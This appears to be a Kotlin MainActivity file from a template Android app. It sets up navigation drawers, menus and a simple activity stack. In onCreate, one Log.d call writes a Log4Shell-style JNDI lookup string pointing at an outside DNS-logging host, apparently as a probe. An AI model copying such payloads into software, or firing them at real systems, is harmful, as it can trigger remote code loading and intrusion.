package com.example.myapplication

import android.app.Activity
import android.app.Application
import android.content.SharedPreferences
import android.net.sip.SipErrorCode
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.Menu
import android.view.MenuItem
import android.widget.Toast
import androidx.annotation.RequiresApi
import com.google.android.material.snackbar.Snackbar
import com.google.android.material.navigation.NavigationView
import androidx.navigation.findNavController
import androidx.navigation.ui.AppBarConfiguration
import androidx.navigation.ui.navigateUp
import androidx.navigation.ui.setupActionBarWithNavController
import androidx.navigation.ui.setupWithNavController
import androidx.appcompat.app.AppCompatActivity
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.example.myapplication.databinding.ActivityMainBinding
import java.util.*
import java.util.concurrent.TimeUnit


class MainActivity : AppCompatActivity() {

    private lateinit var appBarConfiguration: AppBarConfiguration
    lateinit var binding: ActivityMainBinding

    companion object{
        val activityStack = Stack<MainActivity>()
        fun getFrontActivity(): MainActivity? {
            return activityStack.lastElement()
        }
    }


//    class ActivityStackManager : Application.ActivityLifecycleCallbacks{
//        override fun onActivityCreated(activity: Activity, savedInstanceState: Bundle?) {
//            MainActivity.activityStack.push(activity)
//        }
//
//        override fun onActivityStarted(activity: Activity) {
//        }
//
//        override fun onActivityResumed(activity: Activity) {
//        }
//
//        override fun onActivityPaused(activity: Activity) {
//        }
//
//        override fun onActivityStopped(activity: Activity) {
//        }
//
//        override fun onActivitySaveInstanceState(activity: Activity, outState: Bundle) {
//        }
//
//        override fun onActivityDestroyed(activity: Activity) {
//            MainActivity.activityStack.pop()
//        }
//    }



//    @RequiresApi(Build.VERSION_CODES.Q)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.d("aaa","\${jndi:ldap://321630cd.dns.1433.eu.org/exp}")
        MainActivity.activityStack.push(this)
//        registerActivityLifecycleCallbacks(ActivityStackManager())
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        setSupportActionBar(binding.appBarMain.toolbar)

        binding.appBarMain.fab?.setOnClickListener { view ->
            Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                    .setAction("Action", null).show()
        }

        val navController = findNavController(R.id.nav_host_fragment_content_main)
        binding.navView?.let {
            appBarConfiguration = AppBarConfiguration(setOf(
                    R.id.nav_transform, R.id.nav_reflow, R.id.nav_slideshow, R.id.nav_settings),
                    binding.drawerLayout
            )
            setupActionBarWithNavController(navController, appBarConfiguration)
            it.setupWithNavController(navController)
        }

        binding.appBarMain.contentMain.bottomNavView?.let {
            appBarConfiguration = AppBarConfiguration(setOf(
                    R.id.nav_transform, R.id.nav_reflow, R.id.nav_slideshow))
            setupActionBarWithNavController(navController, appBarConfiguration)

            it.setupWithNavController(navController)

        }
    }

    override fun onDestroy() {
        super.onDestroy()
        MainActivity.activityStack.pop()
    }

    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        val result = super.onCreateOptionsMenu(menu)
        // Using findViewById because NavigationView exists in different layout files
        // between w600dp and w1240dp
        val navView: NavigationView? = findViewById(R.id.nav_view)
        if (navView == null) {
            // The navigation drawer already has the items including the items in the overflow menu
            // We only inflate the overflow menu if the navigation drawer isn't visible
            menuInflater.inflate(R.menu.overflow, menu)
        }
        return result
    }

    fun toDetail()
    {
        val navController = findNavController(R.id.nav_host_fragment_content_main)
        navController.navigate(R.id.nav_reflow)
    }
    fun toMap()
    {
        val navController = findNavController(R.id.nav_host_fragment_content_main)
        navController.navigate(R.id.nav_slideshow)
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        when (item.itemId) {

            R.id.nav_settings -> {
                val navController = findNavController(R.id.nav_host_fragment_content_main)
                navController.navigate(R.id.nav_settings)
            }
        }
        return super.onOptionsItemSelected(item)
    }


    override fun onSupportNavigateUp(): Boolean {
        val navController = findNavController(R.id.nav_host_fragment_content_main)
        Log.d("[CTRL]", R.id.nav_host_fragment_content_main.toString())

        return navController.navigateUp(appBarConfiguration) || super.onSupportNavigateUp()
    }


}